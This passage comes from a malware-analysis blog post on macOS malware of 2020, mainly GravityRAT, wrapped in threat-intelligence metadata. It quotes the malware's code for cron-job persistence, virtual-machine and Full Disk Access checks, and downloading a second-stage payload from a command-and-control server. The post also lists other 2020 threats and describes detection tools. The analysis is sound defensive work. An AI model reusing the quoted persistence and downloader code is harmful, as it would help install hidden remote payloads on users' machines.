various\nwarnings).\n\n\n**Persistence: Cron Job (of a 2nd-stage payload)**\n\nThe samples themselves, don‚Äôt appear to persist. However, (2nd-stage) payloads that are\ndownloaded, are persisted (by the malware).\n\n\n[The Kaspersky report, notes, ‚ÄúThe Mac version ‚Ä¶adds a cron job‚Äù](https://securelist.com/gravityrat-the-spy-returns/99097/)\n\nFor the `Enigma sample, we find this persistence logic in a function named` `format :`\n\n\n-----\n\n```\n 1def format(self, src, des, uc):\n 2 ...\n 3 if not os.path.isfile(des):\n 4   os.system('cp ' + src + ' ' + des)\n 5 if des[-3:] == '.py':\n 6   os.system('sudo crontab -l 2>/dev/null; \n 7         echo \"*/2 * * * * python ' + des + '\" | sudo crontab -')\n 8 else:\n 9   os.chmod(des, 448)\n10   des += ' ' + uc\n11   os.system('sudo crontab -l 2>/dev/null; \n12         echo \"*/2 * * * * ' + des + '\" | sudo crontab -')\n13 return '+O '\n\n```\nVia `crontab the malware persists a downloaded file (a 2nd-stage payload), as a cron job.`\nThis malicious cron job is set to run every two minutes ( */2 * * * * ).\n\nThe `StrongBox sample also persists a downloaded file, via a function` `scheduleMac to`\npersist and launch the downloaded payload. The `scheduleMac function persists the`\ndownloaded payload as cron job, via the builtin `crontab command:`\n```\n 1function scheduleMac(fname,agentTask)\n 2{\n 3 ...                             \n 4 var poshellMac = loclpth+\"/\"+fname;\n 5 execTask('chmod -R 0700 ' + \"\\\"\" + + \"\\\"\" );                 \n 6 \n 7 ...\n 8 arg = agentTask;\n 9 execTask('crontab -l 2>/dev/null; \n10      echo \\' */2 * * * * ' + \"\\\"\" +poshellMac + \"\\\" \" + arg + '\\' \n11      | crontab -', puts22);  \n12}\n\n```\n‚Ä¶the persisted payload, will be (re)launched every two minutes ( */2 * * * * ).\n\n**Capabilities: 1 -stage downloaderst**\n\n\nThe macOS GravityRat samples appear to simply be 1 -stage downloaders ‚Ä¶as the reachst\nout to a remote command & control servers to download (and persist) 2nd-stage payloads.\n\nBefore downloading and persisting the next stage payloads though, the malware performs\nseveral checks (implemented in the the `main.js file):`\n\nCheck if running in a VM\nCheck if not connected to the Internet\nCheck if not running with Full Disk Access (FDA)\n\nLet‚Äôs take a closer look at each of these.\n\n\n-----\n\nThe aptly named function, `VMCheck, checks if the application is running within a Virtual`\nMachine. Virtual machine checks are commonly found in malware, in an attempt to ascertain\nif a malware analyst is (likely) examining the code (in a virtual machine).\n```\n 1function VMCheck(stdout) {\n 2\n 3 if (stdout.includes(\"innotek GmbH\") || \n 4   stdout.includes(\"VirtualBox\") || \n 5   stdout.includes(\"VMware\") || \n 6   stdout.includes(\"Microsoft Corporation\" || \n 7   stdout.includes(\"HITACHI\"))) {\n 8\n 9   axios.post(srdr, {\n10    value: 'vm',\n11    status: true\n12 })\n13\n14 ...\n15\n16 const options = {\n17  type: 'question',\n18  buttons: ['Ok'],\n19  defaultId: 2,\n20  title: 'StrongBOX - Operation Not Permitted in VirtualBOX',\n21  message: 'Action Required',\n22  detail: 'StrongBOX - Unable to load components\\n\n23       Please exit virtual mode to launch the application.'\n24 };\n25\n26 dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n27  app.quit();\n28  app.exit();\n29 });\n\n```\n‚Ä¶pretty easy to see its checking if the passed in parameter ( stdout ) contains strings\nrelated to popular virtual machine products (e.g. `VMware ). So what‚Äôs in the` `stdout`\nparameter? Well, if the malware is running on a macOS system, the `VMCheck function will`\nbe invoked from within a function named `Vmm :`\n```\n1function Vmm() {\n2  var modname = exec(\"system_profiler SPHardwareDataType | grep 'Model Name'\");\n3  var smc = exec(\"system_profiler SPHardwareDataType | grep 'SMC'\");\n4  var modid = exec(\"system_profiler SPHardwareDataType | grep 'Model\nIdentifier'\");\n5  var rom = exec(\"system_profiler SPHardwareDataType | grep 'ROM'\");\n6  var snum = exec(\"system_profiler SPHardwareDataType | grep 'Serial Number'\");\n7  VMCheck(modname + smc + modid + rom + snum);\n8}\n\n```\nThe `Vmm function gets the system identifying information such as the model name, model`\nidentifier, serial number and more. If executed within a virtual machine, this information will\ncontain VM-related strings:\n\n\n-----\n\n```\n$ system_profiler SPHardwareDataType | grep Model Identifier \n Model Identifier: VMware7,1\n$ system_profiler SPHardwareDataType | grep 'ROM'\n   Boot ROM Version: VMW71.00V.16221537.B64.2005150253\n   Apple ROM Info: [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]\n   Welcome to the Virtual Machine\n\n```\n‚Ä¶thus the malware will be able to detect it‚Äôs running within a virtual machine ‚Ä¶and display\nan error message\n```\n 1function VMCheck(stdout) {\n 2\n 3 ...\n 4\n 5 const options = {\n 6   type: 'question',\n 7   buttons: ['Ok'],\n 8   defaultId: 2,\n 9   title: 'StrongBOX - Operation Not Permitted',\n10   message: 'Oops!! Something went wrong. ',\n11   detail: 'Please check your internet connection and try again.'\n12  };\n13\n14  dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n15   app.quit();\n16   app.exit();\n17  });\n18 });\n\n```\nHowever, it appears that perhaps there is bug in the malware‚Äôs code, and an incorrect error\nmessage will be displayed ‚Ä¶ ‚ÄúPlease check your internet connection and try again.‚Äù:\n\n(incorrect) Error Message\nThe `main.js file also contains logic for a simple ‚Äúis connected‚Äù check. Often malware`\nperforms such checks to ensure it can communicate with a remote command and control\nserver, and/or to detect if it is perhaps executing on an offline analysis system.\n\n\n-----\n\nTo ascertain if it s running on an Internet connection system, the malware invokes a function\nnamed `connection which simply attempts to ping` `www.google.com :`\n```\n 1function connection(){ \n 2  execRoot('ping -t 4 www.google.com', function(error, stdout, stderr){\n 3    if(error || error !== null){\n 4        const options = {\n 5      type: 'question',\n 6      buttons: ['Ok'],\n 7      defaultId: 2,\n 8      title: 'Internet Connectivity Required',\n 9      message: 'Action Required',\n10      detail: \"Sorry! Please check your internet connectivity and try again.\"\n11     };\n12   \n13     dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n14      app.quit();\n15      app.exit();\n16     });\n17    \n18  } });\n19}\n\n```\nVia our [Process Monitor, we can observe this execution of the](https://objective-see.com/products/utilities.html#ProcessMonitor) `ping command:`\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"ping\",\n   \"-t\",\n   \"4\",\n   \"www.google.com\"\n  ],\n  \"ppid\" : 1447,\n  \"ancestors\" : [\n   1447,\n   1\n  ],\n  \"path\" : \"/sbin/ping\",\n  ...\n }\n}\n\n```\nLastly the `main.js function checks if the malware has been granted Full Disk Access`\n(FDA).\n\n\n-----\n\nOn recent versions of macOS, applications are prevented from accessing various\nuser/system files, unless the user has manually granted the application ‚ÄúFull Disk Access‚Äù\n(via the System Preferences application).\n\nAs such, malware that desires indiscriminate file system access may attempt to coerce users\ninto granting such access.\n\nIn order to check if has Full Disk Access, `GravityRat attempts to list the files in the`\n```\n~/Library/Safari . As this directory is inaccessible to applications without FDA, this is\n\n```\nsufficient check. If the malware determines it does not have FDA, it will prompt to the user to\ngrant such access:\n```\n 1var ressslt = execRoot('ls ~/Library/Safari', function(err, data, stderr){\n 2\n 3 if(!data || data ==\"\")\n 4 {\n 5  const options = {\n 6      type: 'question',\n 7      buttons: ['Ok'],\n 8      defaultId: 2,\n 9      title: 'StrongBox - Operation Not Permitted',\n10      message: 'Action Required',\n11      detail: \"Please follow the instructions to resolve this issue\n12           System Preferences -> Security & Privacy -> \n13              Full Disk Access to Terminal.app\"\n14     };\n15\n16     dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n17      app.quit();\n18      app.exit();\n19     });\n20     \n21 } });\n22}\n\n```\nIn the `StrongBox sample, the` `main.js file contains logic related to environmental checks`\n(i.e. VM & FDA checks), the core of the malicious logic appears in the `signature.js file.`\nAs such, let‚Äôs now we dive into the `signature.js file.`\n\nAt the start of the `signature.js file we find various variables being initialized:`\n```\n1var srur = 'https://download.strongbox.in/strongbox/';\n2var srdr = 'https://download.strongbox.in/A0B74607.php';\n3var loclpth = path.join(app1.getPath('appData'), '/SCloud');\n\n```\nThese variable appear to the malware‚Äôs command and control server and a directory path,\nfound within the user application data directory (that we‚Äôll see is used for persistence).\n\nThe malware‚Äôs server, download.strongbox.in, appears to be now offline:\n\n$ nslookup download strongbox in Server: 8 8 8 8 Address: 8 8 8 8#53\n\n\n-----\n\nserver can t find download.strongbox.in: SERVFAIL\n\nThe code snippet, getPath(‚ÄòappData‚Äô), will return the ‚ÄúPer-user application data directory‚Äù,\nwhich on macOS points to ~/Library/Application Support.\n\nIf needed, the malware then will create the directory specified in the `loclpth variable`\n( ~/Library/Application Support/SCloud ):\n```\n1if (!fs.existsSync(loclpth)){\n2  fs.mkdirSync(loclpth,0700);\n\n```\nFurther down in the `signature.js file, we can see the malware invoking a function named`\n```\nupdates via the setInterval API:\n1setInterval(updates,180000) \n\n```\nAs its name implies, the `updates will download a file (and ‚Äúupdate‚Äù) from the server`\nspecified in the `srdr variable ( https://download.strongbox.in/A0B74607.php ):`\n```\n 1function updates()\n 2{\n 3 const insst = axios.create();\n 4 var hash = store.get('Hash')\n 5 axios.post(srdr, {\n 6    value: 'update',\n 7    hash: hash\n 8    })\n 9 .then((response) => {\n10    var respns = response.data;\n11    if(respns){\n12    var rply = respns.split('#');\n13    var fname = rply[0].trim();\n14    var agentTask = rply[1];\n15 }\n16    \n17 ...\n18\n19 var dpath;\n20 if(osvar.trim()==\"darwin\")\n21 var file = fs.createWriteStream(dpath);\n22 var request = https.get(srur+'Updates/' + fname, function(response) {\n23 response.pipe(file);\n24 file.on('finish', function() {\n25  getDateTime();\n26  extractzip1(fname,agentTask);\n27  file.close();\n28 });\n29\n30 ...\n31}\n\n```\n\n-----\n\nIf this remote server ( https://download.strongbox.in/A0B74607.php ), provides a\npayload for download, the malware will then invoke the `extractzip1 function:`\n```\n 1function extractzip1(fname,agentTask)\n 2{\n 3 \n 4 var source;\n 5 var sourceTozip;\n 6 if(osvar.trim()==\"darwin\") {\n 7   source = loclpth+\"/\"+fname;\n 8   sourceTozip = source+\".zip\";\n 9 }\n10  \n11 ...\n12 fs.rename(source, sourceTozip, function(err) {\n13 \n14 });\n15\n16 \n17 if(osvar.trim()==\"darwin\") {\n18  var extract = require('extract-zip')\n19  var target= loclpth;\n20  extract(sourceTozip, {dir: target}, function (err) {\n21   \n22   ...\n23   scheduleMac(fname,agentTask);\n24   }\n25  });\n26 }\n27}\n\n```\nAfter appending `.zip, the malware extracts the downloaded (zip) file to the location`\nspecified in the `loclpth variable ( ~/Library/Application Support/SCloud ). Once`\nextracted it invokes a function we discussed earlier `scheduleMac ‚Ä¶which persists (as a`\ncronjob) and launches the downloaded payload.\n\nUnfortunately the remote servers (e.g. `download.strongbox.in ) are now offline, and as`\nsuch, the 2nd stage payloads are not available for analysis.\n\n## üëæ And All Others\n\nThis blog post provided a comprehensive technical analysis of the new mac malware of\n2020. However it did not cover adware or malware from previous years. Of course, this is not\nto say such items are unimportant ‚Ä¶especially when such adware is notarized (to bypass\nApple‚Äôs new security checks), or when existing malware is updated.\n\nAs such, here we include a list (and links to detailed writeups) of other notable items from\n2020, for the interested reader.\n\n\n-----\n\nüëæ `Shlayer /` `Vindinstaller Dropper`\n\nIn June, Intego researchers uncovered:\n\n\"...a new [adware dropper] in the wild, actively spreading through malicious\nresults in Google searches.\nIntego identifies the [adware dropper] as unique new variants of OSX/Shlayer\n(the original variant of which was first discovered by Intego in 2018) and\nOSX/Bundlore (with similarities to past versions of OSX/MacOffers and\nMughthesec/BundleMeUp/Adload)\" -Intego\n\nAdware Dropper (credit: Intego)\nWriteup(s):\n\n[‚ÄúNew Mac malware reveals Google searches can be unsafe‚Äù](https://www.intego.com/mac-security-blog/new-mac-malware-reveals-google-searches-can-be-unsafe/)\n\n[‚ÄúHow a New macOS Malware Dropper Delivers VindInstaller Adware‚Äù](https://www.sentinelone.com/blog/how-a-new-macos-malware-dropper-delivers-vindinstaller-adware/)\n\n\n-----\n\nüëæ `OSX.GMERA (new campaign)`\n\nIn July, ESET researchers lured GMERA malware operators ‚Äúto remotely control their\n_Mac honeypots‚Äù._\n\n\"To learn more about the intentions of this group, we set up honeypots where we\nmonitored all interactions between the GMERA reverse shell backdoors and the\noperators of this malware.\" -ESET\n\nGMERA (run.sh) (credit: ESET)\nWe covered `OSX.GMERA in our ‚ÄúMac malware of 2019 report‚Äù, although ESET`\nresearchers report is noteworthy (in the context of 2020), as they uncovered a new\ncampaign leveraging this malware.\n\nWriteup:\n\n[‚ÄúMac cryptocurrency trading application rebranded, bundled with malware‚Äù](https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/)\n\n\n-----\n\nüëæ Notarized Adware\nIn August, [Peter Dantini (@PokeCaptain) noticed that the website](https://twitter.com/PokeCaptain) `homebrew.sh (not`\n[to be confused with the legitimate Homebrew website brew.sh), was hosting an active](https://objective-see.com/blog/%60brew.sh%60)\nadware campaign\n\n‚Ä¶and that the adware has been notarized (read: approved) by Apple:\n\nNotarized Adware\nThis means even on Big Sur, the adware will (still) be allowed to run!\n\nIn Apple‚Äôs own words, notarization was supposed to ‚Äúgive users more confidence that\n\n_[software] ‚Ä¶has been checked by Apple for malicious components.‚Äù ‚Ä¶maybe not?_\n\nWriteup:\n\n[‚ÄúApple Approved Malware‚Äù](https://objective-see.com/blog/blog_0x4E.html)\n\n\n-----\n\nüëæ `Bundalor Dropper`\n\nIn November, SentinelOne researchers published a report on an adware installer that\n(ab)used resource forks to store its malicious payloads.\n\n‚Ä¶the adware installer also provided user-instructions to ‚Äúbypass‚Äù macOS‚Äôs latest\nmalware mitigations (e.g. notarization):\n\nAdware Dropper (credit: SentinelOne)\nWriteup:\n[‚ÄúResourceful macOS Malware Hides in Named Fork‚Äù](https://labs.sentinelone.com/resourceful-macos-malware-hides-in-named-fork/)\n\n\n-----\n\nüëæ `OSX.OceanLotus (new variant)`\n\nAlso in November, TrendMicro researchers discovered a backdoor that they tied to the\nOceanLotus Group. Upon closer analysis, the application (which masquerades as\nOffice documents) appears to be an updated variant of `OSX.OceanLotus.F :`\n\n\"Due to similarities in dynamic behavior and code with previous OceanLotus\nsamples, it was confirmed to be a variant of the said malware\n\n[OSX.OceanLotus.F]\" -TrendMicro\n\nOceanLotus (credit: TrendMicro)\n\nWriteup:\n[‚ÄúNew MacOS Backdoor Connected to OceanLotus Surfaces‚Äù](https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html)\n\n## Detections\n\nNew malware is notoriously difficult to detect via traditional signature-based approaches ‚Ä¶\nas, well, it‚Äôs new! A far better approach is to leverage heuristics or behaviors, that can detect\nsuch malware, even with no a priori knowledge of the specific (new) threats.\n\nFor example, imagine you open an Office Document that (unbeknownst to you) contains an\nexploit or malicious macros which installs a persistent backdoor. This is clearly an unusual\nbehavior, that should be detected and alerted upon.\n\nGood news, our free macOS security tools do not leverage signatures, but instead monitor\nfor such (unusual, and likely malicious) behaviors. This allows them to detect and alert on\nvarious behaviors of all the new malware of 2020 (with no prior knowledge of the malware).\n\nFor example, let‚Äôs look at how `OSX.Dacls was be detected by our free tools:`\n\n\n-----\n\n[BlockBlock readily detects when the malware s attempts to persist as a launch item](https://objective-see.com/products/blockblock.html)\n( com.aex-loop.agent.plist ‚Üí `~/Library/.mina ):`\n\n[LuLu detects the malware‚Äôs unauthorized network communications to the attackers‚Äô](https://objective-see.com/products/lulu.html)\nremote command & control server ( ~/Library/.mina ‚Üí `67.43.239.146 ):`\n\n\n-----\n\n[KnockKnock can scan a system and generically if it is infected with](https://objective-see.com/products/knockknock.html) `OSX.Dacls, by`\ndetecting its launch item persistence ( com.aex-loop.agent.plist ‚Üí\n```\n   ~/Library/.mina ):\n\n```\nRecall that `OSX.EvilQuest would ransom a user‚Äôs files. Well good news, our`\n[RansomWhere? utility could both detect and stop this malicious behavior in its tracks:](https://objective-see.com/products/ransomwhere.html)\n\nThe other new malware samples are similarly detected when they persist, generate an\nunauthorized network connection, or perform other malicious actions.\n\nFor more information about our free tools, see:\n\n[Objective-See's Tools.](https://objective-see.com/products.html)\n\n## Conclusion:\n\nWell that‚Äôs a wrap! Thanks for joining our ‚Äújourney‚Äù as we wandered through the macOS\nmalware of 2020.\n\nWith the continued growth and popularity of macOS (especially in the enterprise!), 2021 will\nsurely bring a bevy of new macOS malware.\n\n‚Ä¶so, stay safe out there!\n\n\n-----\n\nAnd if you d like to learn more about macOS malware and malware analysis techniques, I ve\nwritten an entire (free) book on this very topic:\n\nüìö [The Art Of Mac Malware, Vol. 0x1: Analysis](https://taomm.org/)\n\nLove these blog posts?\n[Support my tools & writing on patreon :)](https://www.patreon.com/bePatron?c=701171)\n\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-01 - The Mac Malware of 2020 - a comprehensive analysis of the year's new malware.pdf"
    ],
    "report_names": [
        "2021-01-01 - The Mac Malware of 2020 - a comprehensive analysis of the year's new malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
